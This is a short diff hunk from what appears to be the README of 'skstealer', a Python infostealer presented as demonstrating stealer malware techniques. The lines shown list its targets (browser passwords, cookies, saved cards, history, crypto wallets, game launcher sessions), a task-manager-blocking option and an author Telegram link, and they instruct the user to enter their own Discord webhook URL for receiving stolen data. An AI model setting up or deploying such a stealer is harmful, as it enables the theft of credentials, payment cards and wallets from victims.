@@ -25,7 +25,7 @@ This is a Python script that demonstrates the techniques used by "stealer" malwa
           self.malware_author = "https://t.me/CirqueiraDev"
           self.browser_infos = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
           self.session_files = ["Wallets", "Game Launchers", "Apps"]
-          self.task_manager_blocked = False
+          self.task_manager_blocked = False # dont change this line
 ```
 2. Open the `skstealer.py` file and modify the configuration inside the `Malware` class:
    - Change `self.webhook_url` to your actual Discord webhook URL.
